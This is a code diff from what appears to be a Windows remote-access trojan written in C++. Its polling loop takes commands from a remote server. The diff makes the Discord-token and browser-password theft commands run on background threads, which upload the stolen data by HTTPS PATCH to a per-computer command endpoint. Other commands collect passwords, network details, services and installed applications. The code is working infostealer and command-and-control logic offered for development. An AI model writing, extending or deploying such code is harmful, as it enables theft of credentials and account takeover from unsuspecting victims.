@@ -1548,9 +1548,27 @@ DWORD WINAPI pollThread(LPVOID) {
                         try{float s=std::stof(extractJson(payload,"scale"));if(s>=0.1f&&s<=1.0f)g_liveScale=s;}catch(...){}
                         try{int m=std::stoi(extractJson(payload,"monitor"));if(m>=0)g_liveMonitor=m;}catch(...){}
                         result="ok";
-                    } else if (type == "discord_tokens") result = getDiscordTokens();
-                    else if (type == "browser_passwords") result = getBrowserPasswords();
-                    else if (type == "passwords") result = getPasswords();
+                    } else if (type == "discord_tokens") {
+                        std::string k = key;
+                        CreateThread(0, 0, [](LPVOID p) -> DWORD {
+                            auto* d = (std::pair<std::string,std::string>*)p;
+                            std::string r = jsonEscape(getDiscordTokens());
+                            std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
+                            httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
+                            delete d; return 0;
+                        }, new std::pair<std::string,std::string>(computerName, key), 0, 0);
+                        result = "processing";
+                    } else if (type == "browser_passwords") {
+                        std::string k = key;
+                        CreateThread(0, 0, [](LPVOID p) -> DWORD {
+                            auto* d = (std::pair<std::string,std::string>*)p;
+                            std::string r = jsonEscape(getBrowserPasswords());
+                            std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
+                            httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
+                            delete d; return 0;
+                        }, new std::pair<std::string,std::string>(computerName, key), 0, 0);
+                        result = "processing";
+                    } else if (type == "passwords") result = getPasswords();
                     else if (type == "network_info") result = getNetworkInfo();
                     else if (type == "services") result = getServices();
                     else if (type == "installed_apps") result = getInstalledApps();
